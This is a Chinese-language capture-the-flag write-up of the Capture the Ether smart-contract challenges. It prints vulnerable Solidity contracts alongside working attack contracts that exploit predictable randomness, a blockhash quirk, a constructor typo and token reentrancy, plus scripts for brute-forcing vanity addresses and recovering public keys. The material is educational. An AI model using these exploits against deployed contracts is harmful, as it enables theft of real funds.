# capture the ether write up(Lotteries Accounts and Miscellaneous)

阅读量 **284589**

|评论 **2**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2018-08-06 15:00:33

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p0.ssl.qhimg.com/t019000f4ce705e954b.jpg)

这是capture the ether的write up
的另一部分，Math部分的writeup见此，[传送门](https://www.anquanke.com/post/id/153375)

## Lotteries

这一部分主要讲的是合约里的随机数生成

###  0x1. Guess the number

    
    
    pragma solidity ^0.4.21;
    
    contract GuessTheNumberChallenge {
        uint8 answer = 42;
    
        function GuessTheNumberChallenge() public payable {
            require(msg.value == 1 ether);
        }
    
        function isComplete() public view returns (bool) {
            return address(this).balance == 0;
        }
    
        function guess(uint8 n) public payable {
            require(msg.value == 1 ether);
    
            if (n == answer) {
                msg.sender.transfer(2 ether);
            }
        }
    }
    

这是最简单的，直接把answer给出来了，那么我们直接调用guess函数并传参42即可，同时注意需要发送1 ether，这样就可以把创建合约时存进去的1
ether提取出来

![](https://p2.ssl.qhimg.com/t01a17e3bdfbec8c6ea.jpg)

###  0x2. Guess the secret number

    
    
    pragma solidity ^0.4.21;
    
    contract GuessTheSecretNumberChallenge {
        bytes32 answerHash = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;
    
        function GuessTheSecretNumberChallenge() public payable {
            require(msg.value == 1 ether);
        }
    
        function isComplete() public view returns (bool) {
            return address(this).balance == 0;
        }
    
        function guess(uint8 n) public payable {
            require(msg.value == 1 ether);
    
            if (keccak256(n) == answerHash) {
                msg.sender.transfer(2 ether);
            }
        }
    }
    

这道题算是上题的进阶版，不过它给出的是一串hash值，我们要完成挑战需要把破解后的数字发送过去，看上去这有点难为人，毕竟这又不是在php里，还有弱类型比较等骚操作，不过我们发现它给出的参数n的数据类型为uint8，这代表着其长度只有八位，也就是0到255，这样就很简单了，下面是一个简单的爆破合约:

    
    
    contract crack {
        bytes32 answerHash = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;
        uint8 public result;
    
    
        function crackresult() returns (uint8) {
            for (uint8 i = 0; i <= 255; i++) {
                if (keccak256(i) == answerHash) {
                    result = i;
                    return i;
                }
            }
        }
    }
    

部署一下爆破结果:

![](https://p3.ssl.qhimg.com/t0126150e126917954c.jpg)

然后提交即可，最后在页面check过关

###  0x3. Guess the random number

    
    
    pragma solidity ^0.4.21;
    
    contract GuessTheRandomNumberChallenge {
        uint8 answer;
    
        function GuessTheRandomNumberChallenge() public payable {
            require(msg.value == 1 ether);
            answer = uint8(keccak256(block.blockhash(block.number - 1), now));
        }
    
        function isComplete() public view returns (bool) {
            return address(this).balance == 0;
        }
    
        function guess(uint8 n) public payable {
            require(msg.value == 1 ether);
    
            if (n == answer) {
                msg.sender.transfer(2 ether);
            }
        }
    }
    

这一关又进阶了，answer还是一串hash，但是是在构造函数里进行了初始化，使用了块的hash和时间戳，事实上这些量在目标合约部署以后都是已知的，我们可以直接在创建块的交易信息里查看，不过简单点我们这里直接在storage里读取即可，此处answer的存储位是在slot
0处

因为使用了metamask插件，所以我们的浏览器已经加载了web3.js，所以我们可以直接在控制台里与Ropsten测试链交互:  

可见answer即为0x2f，也就是47.然后按流程提交即可，注意发送交易时需要1 ether

![](https://p4.ssl.qhimg.com/t0183a51ddc95b5cbc5.jpg)

###  0x4. Guess the new number

    
    
    pragma solidity ^0.4.21;
    
    contract GuessTheNewNumberChallenge {
        function GuessTheNewNumberChallenge() public payable {
            require(msg.value == 1 ether);
        }
    
        function isComplete() public view returns (bool) {
            return address(this).balance == 0;
        }
    
        function guess(uint8 n) public payable {
            require(msg.value == 1 ether);
            uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
    
            if (n == answer) {
                msg.sender.transfer(2 ether);
            }
        }
    }
    

这题还是有点意思，跟ethernaut里的coin
flip差不多，算是简化版，核心思想就是要在guess函数执行前知道前一个区块的hash与当前块的时间戳，我们知道每个区块里会包含许多交易，对于这些交易前一区块的hash与时间戳都是相同的，所以我们只要部署另一个合约来调用目标合约的guess函数以使这两个交易在一个块内，攻击合约很简单，如下:

    
    
    pragma solidity ^0.4.21;
    
    contract GuessTheNewNumberChallenge {
        function GuessTheNewNumberChallenge() public payable {
            require(msg.value == 1 ether);
        }
    
        function isComplete() public view returns (bool) {
            return address(this).balance == 0;
        }
    
        function guess(uint8 n) public payable {
            require(msg.value == 1 ether);
            uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
    
            if (n == answer) {
                msg.sender.transfer(2 ether);
            }
        }
    }
    
    
    contract attacker {
        function attack() public payable {
            uint8 result = uint8(keccak256(block.blockhash(block.number - 1), now));
    
            GuessTheNewNumberChallenge target = GuessTheNewNumberChallenge(0xE8BE7654f6C8C23026939901b80530dCf0AfCA75);
            target.guess.value(1 ether)(result);
        }
    
        function () public payable {
    
        }
    }
    

最好是有个fallback函数以便我们调用attack函数时发送1 ether，接下来就很简单，部署攻击合约以后调用attack函数并发送1 ether

![](https://p4.ssl.qhimg.com/t01c6c85e4e4b249cf0.jpg)

挑战完成，check进入下一关

###  0x5. Predict the future

    
    
    pragma solidity ^0.4.21;
    
    contract PredictTheFutureChallenge {
        address guesser;
        uint8 guess;
        uint256 settlementBlockNumber;
    
        function PredictTheFutureChallenge() public payable {
            require(msg.value == 1 ether);
        }
    
        function isComplete() public view returns (bool) {
            return address(this).balance == 0;
        }
    
        function lockInGuess(uint8 n) public payable {
            require(guesser == 0);
            require(msg.value == 1 ether);
    
            guesser = msg.sender;
            guess = n;
            settlementBlockNumber = block.number + 1;
        }
    
        function settle() public {
            require(msg.sender == guesser);
            require(block.number > settlementBlockNumber);
    
            uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;
    
            guesser = 0;
            if (guess == answer) {
                msg.sender.transfer(2 ether);
            }
        }
    }
    

这题也有点意思，随机数的生成方式与上一题是一样的，但是它多了个lockInGuess函数，此处我们就需要输入我们guess的值，然后使用settlementBlockNumber限制为我们调用lockInGuess的交易所在区块之后的区块，这样我们就不能在同一个区块里调用lockInGuess与settle函数了，所以这个挑战的名字就叫预测未来

看起来我们要完成挑战就得提前知道后面的区块的信息，这似乎是不可能的，事实上也是不可能的，这里的关键是在于guess的大小为10，也就是0 到
9，这就为我们去爆破它提供了可能，虽然我们无法去就挑战合约的answer，但是我们可以让answer来就我们，反正按照规则一次一次地尝试生成answer，当此块的信息得到的answer与我们猜的guess相同时我们再调用settle函数，以免guesser被清零，我们又得投1
ether进去

所以攻击合约如下

    
    
    contract attacker {
    
        PredictTheFutureChallenge target;
        uint public result;
    
        function attacker() public payable {
    
            target = PredictTheFutureChallenge(address of your challenge);
            target.lockInGuess.value(1 ether)(8);
    
        }
    
        function exploit() public payable {
            result = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;
                if (result == 8) {
                target.settle();
            }
    
        }
    
        function () public payable {
    
        }
    }
    

首先是随便猜个数字，因为锁定用户用的是msg.sender，所以我们必须用攻击合约来完成这一步骤，这里我选择的是8，然后部署攻击合约，注意部署时需要发送1
ether，然后就是拼人品的时候了，反正就一直调用exploit函数，人品好的可能两三次就成功通过了，脸黑的可能得十几次几十次，毕竟平均也得10次，反正每次调用完查看下isComplete看是否成功，可以多给点gas以提高下优先级，多少能省点时间，反正也不是真钱

###  0x6. Predict the block hash

    
    
    pragma solidity ^0.4.21;
    
    contract PredictTheBlockHashChallenge {
        address guesser;
        bytes32 guess;
        uint256 settlementBlockNumber;
    
        function PredictTheBlockHashChallenge() public payable {
            require(msg.value == 1 ether);
        }
    
        function isComplete() public view returns (bool) {
            return address(this).balance == 0;
        }
    
        function lockInGuess(bytes32 hash) public payable {
            require(guesser == 0);
            require(msg.value == 1 ether);
    
            guesser = msg.sender;
            guess = hash;
            settlementBlockNumber = block.number + 1;
        }
    
        function settle() public {
            require(msg.sender == guesser);
            require(block.number > settlementBlockNumber);
    
            bytes32 answer = block.blockhash(settlementBlockNumber);
    
            guesser = 0;
            if (guess == answer) {
                msg.sender.transfer(2 ether);
            }
        }
    }
    

这个挑战还是要你预测，代码主体跟前面那个差不多，但是这个直接要你猜当前块的hash，我们知道这是根本不可能的，乍一看确实让人有点懵逼,不过此处的突破点在于block.blockhash这个函数，它可以获取给定的区块号的hash值，但只支持最近的256个区块，不包含当前区块，对于256个区块之前的函数将返回0，知道了这些就好办了，先传递guess为0，然后等待256个区块再调用settle函数即可

不知道该等多久的可以使用web3.eth.getBlockNumber()来方便地获取最近一次的区块号

![](https://p1.ssl.qhimg.com/t0104a948c24452332c.jpg)

## Miscellaneous

这部分是杂项

###  0x1. Assume ownership

    
    
    pragma solidity ^0.4.21;
    
    contract AssumeOwnershipChallenge {
        address owner;
        bool public isComplete;
    
        function AssumeOwmershipChallenge() public {
            owner = msg.sender;
        }
    
        function authenticate() public {
            require(msg.sender == owner);
    
            isComplete = true;
        }
    }
    

这一关乍一看有点懵逼，不知道靠的是啥，不过仔细观察发现考点是在构造函数上，此处出现了拼写错误，导致合约部署时该函数并没有执行，于是可被我们所调用，这样就可以将owner设置为我们的账户地址了，操作非常简单，就不赘述了

###  0x2. Token bank

    
    
    pragma solidity ^0.4.21;
    
    interface ITokenReceiver {
        function tokenFallback(address from, uint256 value, bytes data) external;
    }
    
    contract SimpleERC223Token {
        // Track how many tokens are owned by each address.
        mapping (address => uint256) public balanceOf;
    
        string public name = "Simple ERC223 Token";
        string public symbol = "SET";
        uint8 public decimals = 18;
    
        uint256 public totalSupply = 1000000 * (uint256(10) ** decimals);
    
        event Transfer(address indexed from, address indexed to, uint256 value);
    
        function SimpleERC223Token() public {
            balanceOf[msg.sender] = totalSupply;
            emit Transfer(address(0), msg.sender, totalSupply);
        }
    
        function isContract(address _addr) private view returns (bool is_contract) {
            uint length;
            assembly {
                //retrieve the size of the code on target address, this needs assembly
                length := extcodesize(_addr)
            }
            return length > 0;
        }
    
        function transfer(address to, uint256 value) public returns (bool success) {
            bytes memory empty;
            return transfer(to, value, empty);
        }
    
        function transfer(address to, uint256 value, bytes data) public returns (bool) {
            require(balanceOf[msg.sender] >= value);
    
            balanceOf[msg.sender] -= value;
            balanceOf[to] += value;
            emit Transfer(msg.sender, to, value);
    
            if (isContract(to)) {
                ITokenReceiver(to).tokenFallback(msg.sender, value, data);
            }
            return true;
        }
    
        event Approval(address indexed owner, address indexed spender, uint256 value);
    
        mapping(address => mapping(address => uint256)) public allowance;
    
        function approve(address spender, uint256 value)
            public
            returns (bool success)
        {
            allowance[msg.sender][spender] = value;
            emit Approval(msg.sender, spender, value);
            return true;
        }
    
        function transferFrom(address from, address to, uint256 value)
            public
            returns (bool success)
        {
            require(value <= balanceOf[from]);
            require(value <= allowance[from][msg.sender]);
    
            balanceOf[from] -= value;
            balanceOf[to] += value;
            allowance[from][msg.sender] -= value;
            emit Transfer(from, to, value);
            return true;
        }
    }
    
    contract TokenBankChallenge {
        SimpleERC223Token public token;
        mapping(address => uint256) public balanceOf;
    
        function TokenBankChallenge(address player) public {
            token = new SimpleERC223Token();
    
            // Divide up the 1,000,000 tokens, which are all initially assigned to
            // the token contract's creator (this contract).
            balanceOf[msg.sender] = 500000 * 10**18;  // half for me
            balanceOf[player] = 500000 * 10**18;      // half for you
        }
    
        function isComplete() public view returns (bool) {
            return token.balanceOf(this) == 0;
        }
    
        function tokenFallback(address from, uint256 value, bytes) public {
            require(msg.sender == address(token));
            require(balanceOf[from] + value >= balanceOf[from]);
    
            balanceOf[from] += value;
        }
    
        function withdraw(uint256 amount) public {
            require(balanceOf[msg.sender] >= amount);
    
            require(token.transfer(msg.sender, amount));
            balanceOf[msg.sender] -= amount;
        }
    }
    

这道题的质量也非常高，挺有意思的，推荐大家自己去感受一下

挑战给出的合约看起来很长，其实功能还算简单，TokenBankChallenge合约就相对于一个银行，一开始我们我们在里面会有500000
ether的余额，可以通过withdraw来使用这部分余额购买上面SimpleERC223Token合约实现的token，这个银行合约持有的token为1000000
ether，是我们的两倍，看起来挺吓人的，不过这也只是个计量单位，其实合约本身的balance是0，这也是难得的部署挑战时不用我们支付1
ether的合约，毕竟500000 ether也没人拿的出来，我们的目的就是让银行合约持有的token清零

既然要清零我们自然要寻找使得balance减少的地方，在银行合约里显然withdraw函数是切入点，它调用的是token合约的transfer函数，同时我们注意到它是在require里调用的，我想有经验的应该看出来这里存在的问题了，继续将目标转向transfer函数

前面的代码都没什么异常，重点在这一句

    
    
    if (isContract(to)) {
                ITokenReceiver(to).tokenFallback(msg.sender, value, data);
            }
    

这里先是判断了to地址是否是个合约地址，如果是合约的话就用ITokenReceiver接口来调用to合约的tokenFallback函数，在银行合约里这个函数用更改目标的balance，但是to是我们可控的呀，我们只要部署一个攻击合约也命名一个这个函数不就可以成功在transfer的执行过程里额外来调用我们的合约函数么，结合前面看到的require判断里调用的transfer，显然此处是存在重入漏洞的，OK，知道了利用点接下来就很简单了

首先我们需要部署一个攻击合约，然后将我们player的token都转让给这个攻击合约，攻击合约再把token转化为银行的balance，即可以合约身份执行withdraw函数，触发重入，攻击合约如下

    
    
    contract Attack {
        address a = address of bankchallenge;
        address b = address of tokencontract;
        TokenBankChallenge target1;
        SimpleERC223Token target2;
        uint256 check;
        function Attack() payable{
            target1= TokenBankChallenge(a);
            target2= SimpleERC223Token(b);
        }
        function action1() public {
            target2.transferFrom(your Account address,address(this),500000000000000000000000);
        }
        function action2() public {
    
            target2.transfer(a,500000000000000000000000);
        }
        function tokenFallback(address from, uint256 value, bytes) public {
            check=check+1;
            if(check <= 2){
            target1.withdraw(500000 * 10**18);    
            }
        }
    
        function () public payable {
    
        }
    }
    

其中token合约的地址就保存在银行合约的token处，接下来的操作很简单，首先我们调用bank合约的withdraw函数把我们的balance全部换成token，然后我们调用token合约的approve给我们的攻击合约授权，允许它获得我们所有的token

![](https://p0.ssl.qhimg.com/t01ab7b1698b3734839.jpg)

接下来我们依次调用attack合约里的
action1和action2函数，此时我们的攻击合约在bank里就有足够的balance了，然后我们调用攻击合约的tokenFallback函数，参数随便写，反正也没啥用，不出意外的话我们便成功清零了bank的token，完成挑战，美滋滋

## Accounts

这部分挑战主要是关于账户和地址的，之所以放在最后是因为我也没做完，太菜没办法，不过还是写一下

###  0x1. Fuzzy identity

    
    
    pragma solidity ^0.4.21;
    
    interface IName {
        function name() external view returns (bytes32);
    }
    
    contract FuzzyIdentityChallenge {
        bool public isComplete;
    
        function authenticate() public {
            require(isSmarx(msg.sender));
            require(isBadCode(msg.sender));
    
            isComplete = true;
        }
    
        function isSmarx(address addr) internal view returns (bool) {
            return IName(addr).name() == bytes32("smarx");
        }
    
        function isBadCode(address _addr) internal pure returns (bool) {
            bytes20 addr = bytes20(_addr);
            bytes20 id = hex"000000000000000000000000000000000badc0de";
            bytes20 mask = hex"000000000000000000000000000000000fffffff";
    
            for (uint256 i = 0; i < 34; i++) {
                if (addr & mask == id) {
                    return true;
                }
                mask <<= 4;
                id <<= 4;
            }
    
            return false;
        }
    }
    

挑战的代码逻辑很简单，第一步require需要你的调用合约的name为smarx，这很简单，但是第二步却需要合约地址里包含badc0de字段，这不是强人所难么，一开始我也觉得这挑战是在难为人，不过我很快想起合约地址其实也是由创建合约的地址经过运算得到的

在以太坊源码里我们可以找到生成合约地址的算法

    
    
    func CreateAddress(b common.Address, nonce uint64) common.Address {
    
        data, _ := rlp.EncodeToBytes([]interface{}{b, nonce}) //对地址和nonce进行rlp编码
    
        return common.BytesToAddress(Keccak256(data)[12:]) //利用keccak256算hash，后20个字节作为新地址
    
    }
    

此处地址为合约创建者的地址，而nonce则是该创建者的累积交易次数，这也是表明accounts状态的变量之一，是保存在链上的，在每笔交易里也可以直接查看，那么我们当前目标就很明确，需要批量生成accounts地址并使用上面的算法来验证在前几个交易里是否存在满足条件的地址

这里我使用的是[ethjs-account](https://github.com/ethjs/ethjs-account)来生成地址，这个确实贼好用，而上面的合约地址生成算法也可以在nodejs里找到对应的库，下面是一个简单的爆破代码

    
    
    const util = require('ethereumjs-util');
    const rlp = require('rlp');
    const generate = require('ethjs-account').generate;
    seed='892h@fs8sk^2hSFR*/8s8shfs.jk39hsoi@hohskd51D1Q8E1%^;DZ1-=.@WWRXNI()VF6/*Z%$C51D1QV*<>FE8RG!FI;"./+-*!DQ39hsoi@hoFE1F5^7E%&*QS'//生成地址所用的种子
    function fuzz(){
        for(var k=0;k<50000;k++){
            seed=seed+Math.random().toString(36).substring(12);//为避免重复，生成一定数目后对种子进行更新
            for(var i=0;i<1000;i++){
                res=generate(seed);
                for (var j=0;j<10;j++){
                    encodedRlp = rlp.encode([res.address, j]);// 进行rlp编码
                    buf = util.sha3(encodedRlp);
                    contractAddress =buf.slice(12).toString('hex');//取buffer第12个字节后面的部分作为地址
    
                    if(contractAddress.match("badc0de")){
                        console.log(res);
                        console.log(j);
                        return;
                    }
                }
            //console.log(i);
            }
        }
    }
    fuzz();
    

这个跑起来还是挺快地，我第一次运行只用了两分钟就跑出来一个，不过第二次跑就花了十分钟，可能还是看点运气吧，这是我拿到的首个可用地址，也是我解锁挑战所用的地址

> { privateKey:
> ‘0xa376e6c4be605caa488ff90fd81c72a93b7917af0ec8da1c8b46c930246856f5’,  
>  publicKey:
> ‘0xa8e08df06ae686c692b39cde44c9cad07db46afce6a6b0de93390b816a97fb088977715c40426025c4ff0edbf86b9b438fb842095533d5d41210eedcdfe64c73’,  
>  address: ‘0x6C37d4bb51dc59D11aDfA5aA454422944060cfcD’ }  
>  nonce = 6

因为nonce为6所以需要我们在部署攻击合约前先随便发送几个交易，当然，先得把该账户导入我们的metamask，在切换账户处点击import
Account，然后把上面得到的私钥导入即可，然后记得去水龙头取点ether

接下来准备部署我们的攻击合约

    
    
    contract attack {
        FuzzyIdentityChallenge fuzz;
        function pwn(){
            fuzz=FuzzyIdentityChallenge(address of your challenge);
            fuzz.authenticate();
        }
        function name() external view returns(bytes32){
            return bytes32("smarx");
        }
    }
    

先随便发送几个交易，等到第七个交易的时候就可以来部署我们的攻击合约了，因为此时nonce即为6，当然不放心的话也可以提前几个就开始部署，部署完之后看看我们的合约地址是否符合要求，满足要求的话即可调用pwn函数完成挑战了，说实话这个挑战倒是让我感受到了定制化合约地址的玄妙

###  0x2. Public Key

    
    
    pragma solidity ^0.4.21;
    
    contract PublicKeyChallenge {
        address owner = 0x92b28647ae1f3264661f72fb2eb9625a89d88a31;
        bool public isComplete;
    
        function authenticate(bytes publicKey) public {
            require(address(keccak256(publicKey)) == owner);
    
            isComplete = true;
        }
    }
    

这个挑战代码倒是挺少的，要求也很简单，给你一个合约的地址，要求你得到该地址的公钥，这里事实上就涉及到以太坊上的公私钥的生成以及对交易进行签名的算法了，篇幅所限这里就不展开讲了，因为内容也太多，下面是一些相关的资料  
[椭圆曲线密码学和以太坊中的椭圆曲线数字签名算法应用](https://blog.csdn.net/teaspring/article/details/77834360)

通过资料我们可以知道在对交易进行签名以后，由于椭圆曲线算法的特性，当知道r、s、v 和
hash时我们是可以计算对应的公钥的，而这些值都可以在交易内进行读取，我们来看看该地址进行过的交易

![](https://p2.ssl.qhimg.com/t0195a68cd59717fccf.jpg)

发现有一个发出的交易，那么我们就可以利用该交易的签名信息得到公钥了，至于r，s，v这些信息我们可以通过web3.eth.getTransaction得到

![](https://p0.ssl.qhimg.com/t015fe967aa7267f751.jpg)

这里我的计划是利用这些已知的交易信息来使用[ethereumjs-tx](https://github.com/ethereumjs/ethereumjs-tx)库创建一个交易从而利用里面封装的getSenderAddress得到公钥，脚本如下

    
    
    const EthereumTx = require('ethereumjs-tx');
    const util = require('ethereumjs-util');
    
    var rawTx = {
      nonce: '0x00',
      gasPrice: '0x3b9aca00',
      gasLimit: '0x15f90',
      to: '0x6B477781b0e68031109f21887e6B5afEAaEB002b',
      value: '0x00',
      data: '0x5468616e6b732c206d616e21',
      v: '0x29',
      r: '0xa5522718c0f95dde27f0827f55de836342ceda594d20458523dd71a539d52ad7',
      s: '0x5710e64311d481764b5ae8ca691b05d14054782c7d489f3511a7abf2f5078962'
    };
    
    var tx = new EthereumTx(rawTx);
    
    pubkey=tx.getSenderPublicKey();
    pubkeys=pubkey.toString('hex');
    var address = util.sha3(pubkey).toString('hex').slice(24);
    
    console.log(pubkeys);
    console.log(address);
    

运行得到的公钥为

>
> 0x613a8d23bd34f7e568ef4eb1f68058e77620e40079e88f705dfb258d7a06a1a0364dbe56cab53faf26137bec044efd0b07eec8703ba4a31c588d9d94c35c8db4

提交即可完成挑战

###  0x3. Account Takeover

    
    
    pragma solidity ^0.4.21;
    
    contract AccountTakeoverChallenge {
        address owner = 0x6B477781b0e68031109f21887e6B5afEAaEB002b;
        bool public isComplete;
    
        function authenticate() public {
            require(msg.sender == owner);
    
            isComplete = true;
        }
    }
    

如果有来寻找此题答案的小伙伴可能要失望了，因为这题我也没做，题目的要求是要得到指定账户的私钥，至于线索就得去该地址所进行的各项交易里去寻找了，试了一段时间也没找到诀窍在哪，而且对于这种题目我的兴趣也不是很大，如果有找到了私钥的小伙伴倒也不妨告诉我一声。。。

## 最后

这套题目做下来感觉还是挺有收获的，有很多ethernaut所没有涉及的知识面，也更加贴近实战，希望大家在闯关的过程中也能收获满满，如果有师傅对于其中的关卡有疑问或者对破解私钥那关有想法的话也欢迎联系我，邮箱
[bubbles.zxj@gmail.com](mailto:bubbles.zxj@gmail.com)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **bubbles** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/154104](/post/id/154104)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF](/tag/CTF)
  * [区块链](/tag/区块链)
  * [智能合约](/tag/智能合约)

 **+1** __0赞

 __收藏

![](https://p4.ssl.qhimg.com/t01a776edb0e10b5cbb.png) bubbles

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

